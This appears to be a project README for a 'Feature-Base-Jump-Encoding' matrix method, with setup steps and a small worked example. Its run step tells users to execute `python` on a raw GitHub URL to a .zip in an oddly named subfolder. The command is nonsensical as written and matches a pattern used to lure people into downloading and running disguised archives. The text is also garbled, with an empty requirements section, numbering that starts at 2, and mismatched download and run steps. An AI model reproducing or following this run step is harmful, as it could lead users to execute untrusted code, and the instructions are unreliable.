## üìñ Overview

Feature-Base-Jump-Encoding is a method to improve the way neural networks handle data. This approach allows you to represent features in a matrix without increasing its size, making it efficient and simple. It can help reduce memory needs while maintaining the quality of output, making it a valuable tool for machine learning.

## üöÄ Getting Started

To get started with Feature-Base-Jump-Encoding, follow these steps.

### üåê System Requirements

2. On the Releases page, find the version you want and download the file that corresponds to your operating system.

3. After the download completes, follow the steps below to run the application.

## üîÑ Running the Software

Once you have installed the application, follow these steps to run it:

1. **Open your terminal or command prompt.**
   
   - On Windows: Search for `cmd`.
   - On macOS: Search for `Terminal`.
   - On Linux: Use your preferred terminal emulation.

2. **Navigate to the directory where you saved the downloaded file.** Use the `cd` command to change to the correct folder. For example:
   ```
   cd path/to/your/downloaded/file
   ```

3. **Run the application.** Use the following command:

   ```
   python https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip
   ```

   This command starts the application.

4. **Input your data.** Follow the prompts to input your matrix and feature mask when requested.

## üõ†Ô∏è How It Works

The Feature-Base-Jump-Encoding works using some simple steps:

1. **Input Data:**
   - Your original data must be in a 2D numpy array format.
   - Create a feature mask of the same shape, using 1s where a feature is present and 0s where there isn't.
   - Choose a base value that is larger than any value in your matrix.

2. **Encoding:**
   - The application will increment the values in your matrix by a fixed "base jump" each time a feature is detected.

3. **Decoding:**
   - You can retrieve the original values and count how many features were detected through simple arithmetic.

## üéì Examples

### Example 1: Simple Encoding

Suppose you have a 2D matrix as follows:

```
[[0, 2, 0],
 [3, 0, 1]]
```

And a feature mask like this:

```
[[0, 1, 0],
 [0, 0, 1]]
```

If your base is set to 5, the encoding process will add 5 to the existing values where a feature is detected, resulting in:

```
[[0, 7, 0],
 [3, 0, 6]]
```

### Example 2: Retrieving Original Values

Given the encoded matrix above, you can easily decode it back to the original values along with counts of features detected.

## üí° Benefits

- **Memory-efficient:** You do not increase the size of your matrix, helping in applications with limited memory.
- **Lossless Decoding:** Retrieve original values and feature counts without any loss of information.
- **Ease of Use:** Simple logic makes it easy to implement in various projects.
